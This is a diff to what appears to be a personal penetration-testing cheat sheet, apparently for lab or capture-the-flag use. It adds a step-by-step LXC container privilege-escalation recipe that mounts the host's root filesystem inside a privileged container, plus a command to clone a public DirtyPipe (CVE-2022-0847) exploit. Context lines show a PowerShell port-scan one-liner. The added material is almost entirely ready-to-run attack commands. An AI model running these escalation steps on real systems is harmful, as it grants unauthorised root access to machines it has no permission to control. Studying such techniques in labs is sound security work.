@@ -190,6 +190,22 @@ arp -a
 
 `1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.129.25.115",$_)) "Port $_ is open!"} 2>$null`
 
+## Containers
+
+### lxc example
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/eba875bc-37ee-45ad-b2f6-399e9814e086)
+
+```
+cd ContainerImages/
+ls
+lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias to_hack
+lxc init to_hack privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc -- sh -c 'ls /mnt/root/root/'
+```
+
 ## Linpeas
 
 ![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/1d905cd4-cd79-4c26-9735-09ae03ec6b55)
@@ -202,5 +218,12 @@ arp -a
 ### cve-2021-4034
 
 ![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/2effd935-52ff-4625-b15b-f3ad4a438c4d)
+
+### cve-2022-0847
+
+```
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+```
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/76aff3f3-4432-472f-a914-7c08c74a1148)
 
 
